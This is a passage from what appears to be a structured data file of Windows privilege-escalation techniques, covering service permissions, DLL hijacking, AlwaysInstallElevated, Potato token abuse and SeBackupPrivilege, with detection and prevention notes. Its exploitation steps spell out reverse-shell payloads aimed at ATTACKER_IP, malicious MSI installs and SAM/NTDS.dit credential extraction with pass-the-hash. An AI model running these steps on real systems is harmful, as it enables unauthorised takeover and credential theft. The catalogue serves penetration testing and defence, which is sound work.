    ]
  },
  {
    id: 'windows-weak-service-binary-permissions',
    name: 'Weak Service Binary Permissions (Modifiable Service Executable)',
    category: 'Service Misconfiguration',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'Beyond the service configuration itself, the executable file a service points to can be independently misconfigured with weak NTFS file ' +
      'permissions that grant write access to a low-privileged user or group. If a low-privileged user can overwrite the binary file that a SYSTEM- or ' +
      'administrator-run service will execute, they can replace it entirely with a malicious payload. The next time the service starts, whether ' +
      'triggered manually, on a schedule, on boot, or by an administrator troubleshooting the service, Windows executes the attacker-controlled file ' +
      'with the service\'s configured privileges. This is functionally simpler than the unquoted-path technique since no path-guessing is required -- ' +
      'the attacker directly overwrites the known, correct binary.',
    enumeration_commands: [
      { command: 'wmic service get name,pathname,startname | findstr /i /v "C:\\Windows"', description: 'List non-default services and their configured logon account to prioritize SYSTEM/admin-run services outside the trusted Windows directory tree.', what_to_look_for: 'Third-party or custom services running as LocalSystem with a binary located outside C:\\Windows\\System32.' },
      { command: 'icacls "C:\\Path\\To\\service.exe"', description: 'Check the file-level ACL of a candidate service executable directly.', what_to_look_for: '(F), (M), or (W) granted to Everyone, Authenticated Users, or a broad Users group.' },
      { command: 'accesschk64.exe -accepteula -uwqs "C:\\Path\\To\\service.exe"', description: 'Use Sysinternals AccessChk with the -w flag to directly list writable files, a faster and more reliable method than manual icacls parsing across many services.', what_to_look_for: 'A positive write result for a low-privileged group.' },
      { command: 'Get-Acl "C:\\Path\\To\\service.exe" | Format-List', description: 'PowerShell equivalent for retrieving the full access control list of a specific service binary.', what_to_look_for: 'FileSystemRights of Write, Modify, or FullControl assigned to a non-administrative identity.' }
    ],
    exploitation_steps: [
      'Enumerate all installed services and their configured executable paths and logon accounts, prioritizing those running as LocalSystem or a privileged domain/local account.',
      'For each candidate, check the NTFS permissions on the actual service binary file (not just its containing directory) using icacls, accesschk, or Get-Acl.',
      'Identify any binary writable by your current user or a group you belong to.',
      'Back up the original binary if operating under an authorized engagement requiring restoration afterward.',
      'Overwrite the service binary with a malicious payload generated to match the required functionality expectations (a reverse shell, or a payload that creates a new administrative user), e.g. msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o service.exe.',
      'Restart the service (sc start SERVICENAME / Restart-Service) if permitted, or wait for the next natural trigger such as a reboot or scheduled restart.',
      'Catch the resulting reverse shell or verify the payload\'s effect, confirming the process runs with the service\'s configured elevated privileges.',
      'Verify with whoami /priv, restore the original binary if required by scope, and document the exact file path and permission finding.'
    ],
    tools: ['icacls', 'Sysinternals AccessChk', 'PowerUp (Get-ModifiableServiceFile)', 'WinPEAS', 'msfvenom'],
    detection:
      'File integrity monitoring on all service executable paths, Sysmon Event ID 2 (file creation time changed) and Event ID 11 (file create), and ' +
      'code-signing verification checks that alert when a previously signed service binary becomes unsigned or differently signed are the primary ' +
      'detection controls.',
    prevention:
      'Ensure service binaries are installed with restrictive NTFS permissions (write access limited to Administrators/SYSTEM/TrustedInstaller only), ' +
      'verify installer packages set correct ACLs by default, and periodically audit service binary permissions using PowerUp\'s ' +
      'Get-ModifiableServiceFile or equivalent automated tooling.',
    real_world_examples: [
      { reference: 'CWE-732 Incorrect Permission Assignment for Critical Resource', description: 'Weak service binary permissions are a routine finding in third-party software that installs into a custom directory without properly restricting write access, and remain a top-cited Windows privesc technique in OSCP and CRTP-style training as well as real assessments.' }
    ]
  },
  {
    id: 'windows-weak-service-registry-permissions',
    name: 'Weak Service Registry Permissions (Modifiable ImagePath / Service Config)',
    category: 'Service Misconfiguration',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      'Every Windows service is fundamentally defined by a registry key under HKLM\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName>, and the values ' +
      'within that key -- most critically ImagePath, which specifies the executable and arguments the service control manager launches -- determine the ' +
      'service\'s runtime behavior. If the registry key itself has a weak discretionary access control list (DACL) granting SetValue or FullControl to a ' +
      'low-privileged user or group, that user can directly modify ImagePath to point at an arbitrary attacker-controlled executable, entirely ' +
      'bypassing any file-permission hardening that might otherwise protect the original binary. This is arguably more dangerous than weak file ' +
      'permissions because registry ACL misconfigurations are less commonly audited and can also allow changing the service\'s logon account or start ' +
      'type.',
    enumeration_commands: [
      { command: 'accesschk64.exe -accepteula -kvuqsw hklm\\system\\currentcontrolset\\services', description: 'Recursively enumerate registry key permissions under the Services hive using Sysinternals AccessChk with the -k flag for registry keys.', what_to_look_for: 'Any service subkey where a low-privileged group (Everyone, Authenticated Users, Users) has KEY_SET_VALUE, KEY_WRITE, or KEY_ALL_ACCESS.' },
      { command: 'reg query hklm\\system\\currentcontrolset\\services\\SERVICENAME', description: 'Directly query a candidate service\'s registry configuration to view its current ImagePath and other settings.', what_to_look_for: 'The current legitimate ImagePath value, to be replaced if the key is found writable.' },
      { command: 'Get-Acl "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SERVICENAME" | Format-List', description: 'PowerShell equivalent for retrieving the registry key\'s access control list.', what_to_look_for: 'A RegistryRights entry of SetValue, WriteKey, or FullControl assigned to a non-administrative identity.' }
    ],
    exploitation_steps: [
      'Run accesschk against the full Services registry hive to identify any service key writable by a low-privileged group.',
      'For a writable service, note the current ImagePath and StartName values with reg query for reference/restoration.',
      'Overwrite the ImagePath value with a command that will execute your payload, e.g. reg add hklm\\system\\currentcontrolset\\services\\SERVICENAME /v ImagePath /t REG_EXPAND_SZ /d "C:\\Users\\Public\\payload.exe" /f.',
      'Optionally also modify the ObjectName (logon account) value if you additionally want to change which account the service runs as, though the default LocalSystem context is usually already sufficient for full escalation.',
      'Place the payload executable at the specified path (e.g. a reverse shell or a local-admin-creating batch payload generated with msfvenom).',
      'Start or restart the service (sc start SERVICENAME) if you have the required privilege, or wait for the next boot/service restart.',
      'Catch the resulting reverse shell or confirm the payload\'s effect, running with the service\'s configured elevated privileges.',
      'Restore the original ImagePath value after demonstrating impact if required by the engagement\'s rules of engagement.'
    ],
    tools: ['Sysinternals AccessChk', 'reg.exe', 'PowerUp (Get-ModifiableServiceFile / service registry checks)', 'WinPEAS'],
    detection:
      'Registry auditing (via Windows Advanced Audit Policy: Object Access > Registry, or Sysmon Event ID 13 for registry value modification) on the ' +
      'Services hive is the primary detection control; alert specifically on ImagePath value changes for services running as SYSTEM.',
    prevention:
      'Ensure default, restrictive ACLs on the Services registry hive are never weakened by third-party installers or misguided troubleshooting steps; ' +
      'periodically audit registry ACLs with accesschk as part of routine hardening reviews, and apply the CIS Microsoft Windows Benchmark controls ' +
      'covering service registry key permissions.',
    real_world_examples: [
      { reference: 'CWE-732 / CWE-269 Improper Privilege Management', description: 'Weak service registry key permissions are a well-documented technique covered extensively in offensive Windows training (CRTP, OSCP, CPTS) and PowerUp/WinPEAS automated checks, arising most often from third-party software installers that misconfigure DACLs during setup.' }
    ]
  },
  {
    id: 'windows-dll-hijacking-search-order',
    name: 'DLL Hijacking via Search Order Manipulation',
    category: 'DLL Hijacking',
    difficulty: 'Medium',
    likelihood: 'Common',
    description:
      'When a Windows application loads a DLL by name without specifying a fully qualified path (a common and often unavoidable pattern for system ' +
      'and third-party DLLs alike), the operating system\'s loader searches a defined sequence of directories to locate a matching file: first the ' +
      'directory the application was launched from, then the system directory (C:\\Windows\\System32), then the 16-bit system directory, then the ' +
      'Windows directory, then the current working directory, and finally each directory listed in the PATH environment variable (the exact order can ' +
      'vary slightly depending on SafeDllSearchMode registry settings, which are enabled by default on modern Windows but can still be manipulated or ' +
      'may not fully protect all load scenarios). If an attacker can write a malicious DLL with the exact name the application expects into any ' +
      'directory searched before the legitimate DLL\'s real location -- most commonly the application\'s own directory, or a writable PATH directory -- ' +
      'the loader will load the attacker\'s DLL instead. If that application (or a service invoking it) runs with elevated privileges, the malicious ' +
      'DLL\'s DllMain function executes attacker code with those elevated privileges.',
    enumeration_commands: [
      { command: 'Procmon.exe (Sysinternals) with a filter for Result "NAME NOT FOUND" and Path ending in ".dll"', description: 'Run Process Monitor against a target privileged application/service to observe every DLL load attempt in real time, including failed lookups that reveal the search order and missing DLLs.', what_to_look_for: 'NAME NOT FOUND results for DLLs in directories writable by your current user, indicating a hijackable load attempt.' },
      { command: 'icacls "C:\\Program Files\\Vulnerable App"', description: 'Check write permissions on the application\'s installation directory, the first location checked in the standard DLL search order.', what_to_look_for: '(W), (M), or (F) granted to a low-privileged group on the application directory.' },
      { command: 'PowerUp.ps1 -> Invoke-AllChecks (Write-HijackableDllHunter / Find-DLLHijack section)', description: 'Run PowerUp\'s automated DLL hijacking discovery function, which scans running processes and services for hijackable DLL load patterns.', what_to_look_for: 'Any positive finding reported by the tool identifying a writable path in a privileged process\'s search order.' },
      { command: 'echo %PATH%', description: 'Check whether any directory in the system or user PATH is writable.', what_to_look_for: 'A writable PATH directory that could serve as a DLL hijack location for any application relying on PATH-based DLL resolution.' }
    ],
    exploitation_steps: [
      'Identify a privileged application or service (running as SYSTEM or an administrative account) and use Procmon to observe its DLL load behavior, filtering for NAME NOT FOUND results.',
      'Identify a DLL name the application attempts to load from a writable directory earlier in the search order than its legitimate location.',
      'Write a malicious DLL exporting the same function names the legitimate DLL would provide if the application calls specific exports (or a minimal DLL relying only on DllMain if the app just loads it without calling exports), with a DllMain that spawns a shell or performs a privileged action on DLL_PROCESS_ATTACH.',
      'Compile the malicious DLL (using msfvenom -p windows/x64/shell_reverse_tcp -f dll -o evil.dll, or custom C/C++ code) and place it at the hijackable path with the exact expected filename.',
      'Trigger the privileged application or service to load the DLL (start/restart the service, or wait for its next natural invocation).',
      'Catch the resulting reverse shell or confirm the payload executed with the application/service\'s elevated privileges.',
      'Verify final privilege level with whoami /priv and document the exact application, DLL name, and hijackable search-order location.'
    ],
    tools: ['Process Monitor (Procmon)', 'PowerUp (Find-PathDLLHijack / Write-HijackDll)', 'Sysinternals Autoruns', 'msfvenom', 'WinPEAS'],
    detection:
      'Sysmon Event ID 7 (image/DLL load) combined with code-signing verification (alerting on unsigned DLLs loaded by signed, privileged processes) ' +
      'is the most effective detection control; application allowlisting solutions (Windows Defender Application Control, AppLocker) that enforce DLL ' +
      'signing requirements prevent exploitation outright.',
    prevention:
      'Load DLLs using fully qualified absolute paths wherever possible, enable and enforce Safe DLL Search Mode, use SetDllDirectory or ' +
      'LOAD_LIBRARY_SEARCH_SYSTEM32 flags in application code to restrict the search path explicitly, and apply strict NTFS permissions to application ' +
      'installation directories to prevent unauthorized DLL planting.',
    real_world_examples: [
      { reference: 'CWE-427 Uncontrolled Search Path Element', description: 'DLL search-order hijacking is one of the most extensively documented Windows local privilege escalation and persistence techniques, catalogued in MITRE ATT&CK as technique T1574.001, and found regularly in both commercial and open-source Windows software.' }
    ]
  },
  {
    id: 'windows-phantom-dll-hijacking',
    name: 'Phantom DLL Hijacking (Missing DLL Exploitation)',
    category: 'DLL Hijacking',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'A phantom DLL is one that an application or a Windows component attempts to load but which does not actually exist anywhere on the system -- ' +
      'often a leftover reference to a DLL that was deprecated, renamed, or was only ever conditionally required (for example, a plugin or optional ' +
      'feature DLL that fails silently if absent, or a DLL referenced by a deleted piece of functionality that was never fully cleaned up from the ' +
      'binary\'s import table). Because no legitimate file exists to compete with, phantom DLL hijacking is often easier to exploit reliably than ' +
      'standard search-order hijacking against an existing DLL: an attacker simply needs to identify the exact expected filename and place a malicious ' +
      'DLL with that name in any directory the loader searches. Notable historical examples include Windows components searching for DLLs like ' +
      'wlbsctrl.dll or ualapi.dll under certain conditions where no such file ships by default.',
    enumeration_commands: [
      { command: 'Procmon.exe filtered on Result "NAME NOT FOUND", Path ends with ".dll"', description: 'Capture DLL load attempts across a broad set of running privileged processes and services over time to identify consistently missing DLL references.', what_to_look_for: 'Repeated NAME NOT FOUND results for the same DLL name across multiple process launches, indicating a stable, exploitable phantom reference rather than a one-off race condition.' },
      { command: 'sigcheck -m suspiciousapp.exe   OR   dumpbin /imports suspiciousapp.exe', description: 'Statically inspect an application\'s import table to identify DLL dependencies that may not exist on a default installation.', what_to_look_for: 'Imported DLL names not present anywhere under C:\\Windows\\System32 or the application\'s own directory.' }
    ],
    exploitation_steps: [
      'Use Procmon to monitor privileged services and scheduled applications over an extended period, filtering for NAME NOT FOUND results on .dll paths.',
      'Confirm the missing DLL is consistently and reliably requested (not a transient artifact) by observing multiple load attempts, ideally across service restarts or scheduled task runs.',
      'Determine every directory searched for that DLL name in the observed load order, and identify the first one writable by your current user.',
      'Write a malicious DLL with the exact expected filename, implementing a DllMain function that executes a payload on DLL_PROCESS_ATTACH (spawn a shell, create an admin user, or inject further code) -- since the DLL is never actually called upon for legitimate exports (as none previously existed), a minimal stub DLL is usually sufficient.',
      'Place the malicious DLL in the identified writable search location.',
      'Trigger the privileged process to run again (service restart, scheduled task execution, or system reboot as applicable).',
      'Confirm the payload executed with the target process\'s elevated privileges and obtain a stable privileged session.'
    ],
    tools: ['Process Monitor (Procmon)', 'Sysinternals Sigcheck', 'dumpbin', 'msfvenom', 'PowerUp'],
    detection:
      'Identical detection approach to standard DLL search-order hijacking: Sysmon Event ID 7 image load monitoring combined with code-signing ' +
      'enforcement and application allowlisting (AppLocker/WDAC) are the most effective controls, since phantom DLL loads are otherwise indistinguishable ' +
      'from legitimate ones at the file-system level until analyzed.',
    prevention:
      'Remove references to unused or deprecated DLLs from application manifests and import tables during development, apply DLL signing enforcement, ' +
      'and restrict write access to all directories in the DLL search path for privileged applications and services.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1574.001 (DLL Search Order Hijacking)', description: 'Phantom DLL hijacking is explicitly documented as a sub-technique variant within MITRE ATT&CK\'s DLL hijacking technique, and has been used both for privilege escalation and long-term persistence by real-world threat actors.' }
    ]
  },
  {
    id: 'windows-dll-sideloading',
    name: 'DLL Side-Loading',
    category: 'DLL Hijacking',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'DLL side-loading differs subtly from classic search-order hijacking: rather than exploiting a missing or misresolved DLL, the attacker places ' +
      'a malicious DLL alongside a legitimate, often digitally signed application executable, relying on the fact that many applications load a ' +
      'same-directory DLL by design (the application directory is always checked first in the standard search order) without verifying the DLL\'s ' +
      'signature or integrity. This technique is especially attractive to attackers because launching a legitimately signed, trusted executable (which ' +
      'then side-loads the malicious DLL from the same folder) can bypass application allowlisting solutions that only validate the signature of the ' +
      'main executable, not every DLL it subsequently loads. In a privilege escalation context, if a signed privileged application or an autorun/ ' +
      'scheduled binary can be copied into (or already exists in) a directory writable by the attacker, planting the companion malicious DLL there ' +
      'achieves code execution at that application\'s privilege level.',
    enumeration_commands: [
      { command: 'Get-ChildItem -Recurse -Include *.exe "C:\\Program Files" | ForEach-Object { Get-AuthenticodeSignature $_.FullName } | Where Status -eq Valid', description: 'Enumerate digitally signed executables across common application directories as candidates for side-loading (signed binaries are more likely to be trusted/allowlisted).', what_to_look_for: 'Signed executables located in or copyable into a directory writable by the current user.' },
      { command: 'Procmon.exe filtered on the target signed executable, watching DLL load events from its own directory', description: 'Confirm exactly which DLLs a candidate signed application attempts to load from its own directory at startup.', what_to_look_for: 'A same-directory DLL load for a DLL name not present in C:\\Windows\\System32, confirming a side-loadable dependency.' },
      { command: 'icacls "C:\\path\\to\\app\\directory"', description: 'Check write permissions on the directory containing the candidate signed executable.', what_to_look_for: 'Write access granted to a low-privileged group.' }
    ],
    exploitation_steps: [
      'Identify a legitimately signed executable (ideally one already allowlisted or trusted by the environment\'s application control policy) that loads a same-directory DLL by name.',
      'Confirm via Procmon exactly which DLL filename is expected and that the directory is writable, or that you can copy both the signed EXE and your malicious DLL into a directory you control.',
      'Write a malicious DLL matching the expected name and exporting any functions the legitimate application actually calls (reverse-engineer required exports with dumpbin /exports on the real DLL if the legitimate one is available for reference), with a DllMain or exported function that executes your payload.',
      'Place the malicious DLL in the same directory as the signed executable.',
      'Launch (or wait for the automatic/scheduled launch of) the signed executable; it loads your malicious DLL from its own directory due to standard search order behavior.',
      'If the setup targets a privileged context (a signed, elevated auto-starting application, or one you can trigger via a scheduled task/service running as SYSTEM), the payload executes with those elevated privileges.',
      'Catch the resulting reverse shell or confirm the payload\'s effect, then verify final privilege level with whoami /priv.'
    ],
    tools: ['Process Monitor (Procmon)', 'dumpbin', 'Sysinternals Sigcheck', 'msfvenom', 'Get-AuthenticodeSignature (PowerShell)'],
    detection:
      'Sysmon Event ID 7 image load monitoring combined with a rule that flags an unsigned or mismatched-publisher DLL loaded from the same directory ' +
      'as a signed, trusted executable is the most precise detection signature; application control solutions configured to validate all loaded modules ' +
      '(not just the launching executable) close this gap directly.',
    prevention:
      'Ship applications with DLL dependency verification (signature checks performed by the loading application itself, or use of Windows\' ' +
      'LoadLibrary with LOAD_LIBRARY_REQUIRE_SIGNED_TARGET where supported), restrict write access to application installation directories, and configure ' +
      'WDAC/AppLocker policies that validate every loaded module rather than only the top-level executable.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1574.002 (DLL Side-Loading)', description: 'DLL side-loading is a widely documented technique used by numerous real-world threat actors (including several APT groups) specifically because it can execute malicious code under the cover of a legitimately signed process, evading both static allowlisting and casual analyst review.' }
    ]
  },
  {
    id: 'windows-alwaysinstallelevated',
    name: 'AlwaysInstallElevated MSI Policy Abuse',
    category: 'Policy Misconfiguration',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      'Windows supports a Group Policy / registry-based setting called AlwaysInstallElevated that, when enabled at both the HKLM (machine-wide) and ' +
      'HKCU (per-user) registry locations, instructs the Windows Installer service to install any .msi package with elevated (SYSTEM) privileges ' +
      'regardless of the invoking user\'s actual permission level. This setting exists to simplify software deployment in managed environments where ' +
      'standard users should not need administrative rights just to install approved software, but when misconfigured and left enabled broadly, it ' +
      'provides a direct and extremely simple privilege escalation path: any low-privileged local user can craft a malicious .msi installer package ' +
      'that, when run, executes arbitrary code (such as adding a new local administrator account or dropping a reverse shell) with SYSTEM privileges, ' +
      'since Windows Installer always processes the package with elevated rights when both registry keys are set to 1.',
    enumeration_commands: [
      { command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'Check the machine-wide policy setting.', what_to_look_for: 'A value of 0x1 (REG_DWORD 1) confirming the machine-level policy is enabled.' },
      { command: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'Check the per-user policy setting, which must also be enabled for the elevation behavior to trigger.', what_to_look_for: 'A value of 0x1 confirming the user-level policy is also enabled, since both keys are required simultaneously.' },
      { command: 'Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" -Name AlwaysInstallElevated ; Get-ItemProperty -Path "HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer" -Name AlwaysInstallElevated', description: 'PowerShell equivalent for retrieving both registry values in one pass.', what_to_look_for: 'AlwaysInstallElevated equal to 1 in both outputs.' }
    ],
    exploitation_steps: [
      'Query both the HKLM and HKCU AlwaysInstallElevated registry values and confirm both are set to 1.',
      'Generate a malicious MSI payload using msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi (or a payload that creates a new local administrator user for a non-reverse-shell approach).',
      'Transfer the MSI file to the target system.',
      'Install the package using Windows Installer, which will process it with elevated privileges regardless of your actual permission level: msiexec /quiet /qn /i evil.msi.',
      'Catch the resulting reverse shell connection on your listener, or confirm the new administrative account was created.',
      'Authenticate with the new administrative credentials or use the SYSTEM-level reverse shell directly, then verify final privilege level with whoami /priv.'
    ],
    tools: ['msfvenom', 'msiexec', 'PowerUp (Get-RegistryAlwaysInstallElevated)', 'WinPEAS'],
    detection:
      'Sysmon Event ID 1 (process creation) monitoring for msiexec.exe launched with unusual parent processes or from non-standard install source ' +
      'locations, combined with registry auditing on the AlwaysInstallElevated keys, is the primary detection approach; Windows Installer event logs ' +
      '(Application log, MsiInstaller source) also record every elevated installation.',
    prevention:
      'Disable AlwaysInstallElevated entirely unless there is a specific, well-understood managed-deployment requirement, and if it must be used, ' +
      'restrict it via Group Policy to only trusted, tightly scoped deployment scenarios with compensating controls such as application allowlisting for ' +
      'MSI package sources.',
    real_world_examples: [
      { reference: 'CWE-269 Improper Privilege Management', description: 'AlwaysInstallElevated is a long-standing, well-known Windows privilege escalation technique built directly into Metasploit\'s exploit/windows/local/always_install_elevated module and covered in essentially every Windows privilege escalation training curriculum due to its reliability when present.' }
    ]
  },
  {
    id: 'windows-token-impersonation-potatoes',
    name: 'Token Impersonation Privilege Abuse (SeImpersonatePrivilege via Juicy/Rotten/Sweet/God Potato and PrintSpoofer)',
    category: 'Token/Privilege Abuse',
    difficulty: 'Low',
    likelihood: 'Common',
    description:
      'SeImpersonatePrivilege allows a process to impersonate the security context of another user or account after obtaining an impersonation-level ' +
      'token from that account, and it is granted by default to service accounts such as Network Service, Local Service, and IIS application pool ' +
      'identities specifically because many Windows services (like IIS or MSSQL) legitimately need to impersonate the calling client. The "Potato" ' +
      'family of exploits abuses this privilege by tricking a SYSTEM-level Windows service (historically the DCOM/OXID resolver or the RPCSS/BITS/ ' +
      'Print Spooler services) into authenticating to a listener the attacker controls -- typically via NTLM relay over a local named pipe or COM/RPC ' +
      'interface -- and then relaying/capturing that SYSTEM authentication token to impersonate it and launch an arbitrary process as SYSTEM. Rotten ' +
      'Potato and Juicy Potato (which added target CLSID enumeration flexibility) rely on the BITS/DCOM RPC 6666 marshaling trick; Rogue/Sweet Potato ' +
      'and later variants adapted the technique as Microsoft patched intermediate mitigations; God Potato and more recent variants (2022 onward) exploit ' +
      'the RPCSS service\'s OXID resolution behavior and work reliably even on modern, fully patched Windows Server versions when SeImpersonatePrivilege ' +
      'is present. PrintSpoofer takes a related but distinct approach, abusing the Print Spooler service\'s named pipe impersonation to achieve the ' +
      'same SYSTEM escalation without relying on the DCOM/OXID trick at all, making it effective even when Potato-style techniques are mitigated.',
    enumeration_commands: [
      { command: 'whoami /priv', description: 'List the current process token\'s enabled and disabled privileges.', what_to_look_for: 'SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege listed, even if shown as Disabled (many Potato variants can still enable it programmatically).' },
      { command: 'whoami /all', description: 'Show the current user context, groups, and privileges together for full situational awareness.', what_to_look_for: 'A service account context (Network Service, Local Service, IIS APPPOOL\\*, MSSQL service account) which commonly holds SeImpersonatePrivilege by default.' },
      { command: 'sc qc Spooler', description: 'Check whether the Print Spooler service is running, a prerequisite for the PrintSpoofer technique specifically.', what_to_look_for: 'A RUNNING state for the Spooler service.' }
    ],
    exploitation_steps: [
      'Confirm SeImpersonatePrivilege (or SeAssignPrimaryTokenPrivilege) is present in the current token via whoami /priv, typically found in the context of a service account, IIS app pool identity, or a process launched by a service.',
      'Determine the Windows version and patch level to select the most reliable available Potato variant, since Microsoft has iteratively patched the underlying DCOM/OXID abuse over several years (older systems: Rotten/Juicy Potato; modern patched systems: GodPotato or PrintSpoofer are generally most reliable as of recent Windows releases).',
      'If the Print Spooler service is running, use PrintSpoofer: PrintSpoofer64.exe -i -c "cmd /c whoami" to confirm SYSTEM execution, then PrintSpoofer64.exe -i -c "cmd" for an interactive SYSTEM shell.',
      'Alternatively, run GodPotato (effective across a broad range of Windows 7 through Server 2022 patch levels): GodPotato -cmd "cmd /c whoami" to confirm, then GodPotato -cmd "cmd /c C:\\path\\to\\reverseshell.exe" or a direct interactive invocation.',
      'For older/legacy targets, JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c whoami" -t * -c {CLSID} can be used, requiring selection of an appropriate, currently-valid CLSID for the target OS version from public CLSID lists.',
      'Once SYSTEM-level command execution is confirmed, either run commands directly through the tool or drop and execute a full reverse shell payload to obtain a stable interactive SYSTEM session.',
      'Verify final privilege level with whoami /priv and whoami, confirming NT AUTHORITY\\SYSTEM.'
    ],
    tools: ['PrintSpoofer', 'GodPotato', 'JuicyPotato', 'RoguePotato', 'SweetPotato', 'RottenPotatoNG', 'SharpEfsPotato'],
    detection:
      'Sysmon Event ID 1 process creation monitoring for known Potato/PrintSpoofer tool names and command-line patterns, combined with monitoring for ' +
      'unexpected named-pipe creation events (Sysmon Event ID 17/18) and anomalous local RPC/DCOM authentication from service accounts, catches most ' +
      'variants; EDR products widely include specific behavioral signatures for the Potato exploit family given its prevalence.',
    prevention:
      'Remove SeImpersonatePrivilege from service accounts that do not strictly require it, keep Windows fully patched (Microsoft has released several ' +
      'mitigations narrowing the attack surface, though newer bypasses continue to emerge), run services under the most restrictive practical account ' +
      'rather than defaulting to Network Service/Local Service, and deploy EDR with behavioral detection tuned specifically for Potato-family tool ' +
      'execution patterns.',
    real_world_examples: [
      { reference: 'CVE-2021-1732 (Windows Win32k Elevation of Privilege, chained in some Potato-adjacent chains)', description: 'While not a Potato technique itself, this and similar kernel-level EoP bugs are frequently chained alongside impersonation-privilege abuse in real intrusion sets to reach SYSTEM from a service account foothold.' },
      { reference: 'GodPotato public release (2022)', description: 'GodPotato specifically re-enabled reliable SeImpersonatePrivilege abuse against Windows Server 2019 and 2022 after Microsoft\'s earlier patches had significantly narrowed the classic Potato techniques\' effectiveness, and rapidly became the de facto standard tool for this technique in current red team engagements.' },
      { reference: 'PrintSpoofer (2020)', description: 'Released by itm4n, PrintSpoofer demonstrated that the Print Spooler service\'s named pipe impersonation could achieve identical SYSTEM escalation to the Potato family through an entirely different mechanism, and remains effective on systems where Print Spooler is enabled.' }
    ]
  },
  {
    id: 'windows-sebackupprivilege-abuse',
    name: 'SeBackupPrivilege Abuse (SAM/SYSTEM/NTDS.dit Extraction)',
    category: 'Token/Privilege Abuse',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'SeBackupPrivilege grants a process the ability to bypass all normal file-system read access control checks (traversing and reading any file ' +
      'regardless of its DACL) specifically to support backup operations, and it is typically granted to members of the built-in Backup Operators group. ' +
      'While this privilege does not directly grant code execution, it provides read access to files that are otherwise protected even from ' +
      'administrators during normal operation, most critically the SAM and SYSTEM registry hives (which together allow offline extraction of local ' +
      'account password hashes) and, on a domain controller, the NTDS.dit Active Directory database file (which contains the hashes of every domain ' +
      'account, enabling a full domain compromise). Because SeBackupPrivilege bypasses DACLs entirely, an attacker holding it can copy these normally- ' +
      'locked files even while they are in active use by the operating system, using backup-aware APIs.',
    enumeration_commands: [
      { command: 'whoami /priv', description: 'Check for SeBackupPrivilege in the current token.', what_to_look_for: 'SeBackupPrivilege listed, whether currently enabled or disabled (it can be enabled programmatically even if shown as disabled by default).' },
      { command: 'whoami /groups', description: 'Confirm membership in the Backup Operators group, the typical source of this privilege.', what_to_look_for: 'BUILTIN\\Backup Operators in the group listing.' }
    ],
    exploitation_steps: [
      'Confirm SeBackupPrivilege is present via whoami /priv, typically due to Backup Operators group membership.',
      'Enable the privilege in the current process token if it is listed as disabled (tools such as the PowerShell module SeBackupPrivilegeUtils or a custom enabler can activate it programmatically since standard user tooling does not enable all privileges by default).',
      'Use a backup-aware copy technique to extract the SAM and SYSTEM hives despite them being actively locked by the OS: reg save hklm\\sam C:\\temp\\sam.hive and reg save hklm\\system C:\\temp\\system.hive, or use diskshadow to create a volume shadow copy and copy the files directly from the shadow snapshot for a more reliable method that also works for NTDS.dit.',
      'On a domain controller, use diskshadow.exe with a scripted shadow-copy creation to access and copy C:\\Windows\\NTDS\\ntds.dit along with the SYSTEM hive needed to decrypt it.',
      'Transfer the extracted hive files to an attacker-controlled machine and use secretsdump.py (Impacket) to extract local account NTLM hashes from SAM/SYSTEM, or full domain account hashes from ntds.dit/SYSTEM: secretsdump.py -sam sam.hive -system system.hive LOCAL, or secretsdump.py -ntds ntds.dit -system system.hive LOCAL.',
      'Use the extracted local Administrator NTLM hash to authenticate via pass-the-hash (e.g. with Impacket\'s psexec.py or wmiexec.py) directly as a local administrator, or leverage extracted domain hashes for further lateral movement and domain compromise.',
      'Verify final access level and document the exact privilege source and extraction method used.'
    ],
    tools: ['reg.exe', 'diskshadow.exe', 'SeBackupPrivilegeUtils / SeBackupPrivilegeCmdLets (PowerShell)', 'Impacket secretsdump.py', 'robocopy (with /B backup-mode flag)'],
    detection:
      'Windows Security Event Log auditing for privilege use (Event ID 4673/4674 for SeBackupPrivilege invocation) combined with monitoring for reg ' +
      'save operations against SAM/SYSTEM hives and diskshadow.exe execution are high-fidelity detection signals, since these operations are rare in ' +
      'normal, non-backup-software workflows.',
    prevention:
      'Restrict Backup Operators group membership to only accounts genuinely responsible for backup operations and ensure backup processes run through ' +
      'dedicated, monitored backup software rather than granting the raw privilege to interactive user accounts; monitor for and alert on manual SAM/ ' +
      'SYSTEM/NTDS.dit extraction attempts regardless of the privilege source.',
    real_world_examples: [
      { reference: 'MITRE ATT&CK T1003.002/T1003.003 (OS Credential Dumping: SAM / NTDS)', description: 'SeBackupPrivilege abuse for credential extraction is explicitly documented in MITRE ATT&CK and is a standard technique in both red team engagements and real-world post-compromise activity whenever Backup Operators membership is obtained.' }
    ]
  },
  {
    id: 'windows-serestoreprivilege-abuse',
    name: 'SeRestorePrivilege Abuse (Arbitrary File Write / Service Binary Replacement)',
    category: 'Token/Privilege Abuse',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'SeRestorePrivilege is the write-side counterpart to SeBackupPrivilege: it allows a process to bypass all file-system access control checks when ' +
      'writing to any file or registry key on the system, again intended to support restoring backed-up data regardless of the current DACLs on the ' +
      'restore target. This privilege is extremely powerful for privilege escalation because it lets an attacker overwrite any file, including a ' +
      'protected SYSTEM-owned service binary, a DLL loaded by a privileged process, or even the SAM registry hive itself, entirely bypassing normal ' +
